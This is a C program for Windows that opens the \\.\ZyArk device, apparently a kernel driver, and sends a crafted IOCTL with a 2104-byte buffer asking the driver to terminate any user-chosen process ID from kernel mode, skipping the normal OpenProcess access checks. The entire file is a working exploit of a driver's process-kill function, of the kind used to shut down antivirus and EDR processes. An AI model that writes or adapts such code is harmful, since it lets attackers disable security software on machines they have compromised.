#include <stdio.h>
#include <windows.h>

// The required input structure for sub_12E58 (Total size: 2104 bytes)
#pragma pack(push, 1)
typedef struct _PID_KILL_REQUEST {
    BYTE   Padding[2096];
    DWORD  TargetPid;
    DWORD  ExitCode;
} PID_KILL_REQUEST, *PPID_KILL_REQUEST;
#pragma pack(pop)

int main(void) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    PID_KILL_REQUEST request = { 0 };
    BOOL bResult = FALSE;
    DWORD bytesReturned = 0;
    DWORD targetPid = 0;
    DWORD driverOutput = 0; // Required output buffer to prevent a kernel crash

    hDevice = CreateFileA(
        "\\\\.\\ZyArk",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to connect to the driver. Error: %lu\n", GetLastError());
        printf("    -> You MUST run this from an Administrator command prompt.\n");
        return -1;
    }

    printf("[+] Successfully connected to \\\\.\\ZyArk\n");
    printf("Enter the Process ID (PID) to terminate via PID-based IOCTL: ");
    if (scanf_s("%u", &targetPid) != 1) {
        CloseHandle(hDevice);
        return -1;
    }

    // Prepare the request buffer (No OpenProcess required!)
    memset(&request, 0, sizeof(request));
    request.TargetPid = targetPid; // Placed at offset 2096
    request.ExitCode = 0;          // Placed at offset 2100

    // NOTE: Replace 0x22CEF4 with the exact IOCTL code mapped to sub_12E58 in the driver's dispatch table
    DWORD ioctlCode = 0x22CEF4; 

    printf("[*] Sending IOCTL 0x%lX to terminate PID %u directly via kernel lookup...\n", ioctlCode, targetPid);

    bResult = DeviceIoControl(
        hDevice,
        ioctlCode,
        &request,
        sizeof(request),      // Input buffer size (2104 bytes)
        &driverOutput,        // lpOutBuffer: points to our local DWORD
        sizeof(driverOutput), // nOutBufferSize (4 bytes)
        &bytesReturned,
        NULL
    );

    if (!bResult) {
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] IOCTL sent successfully. Target process should be terminated.\n");
    }

    CloseHandle(hDevice);
    return 0;
}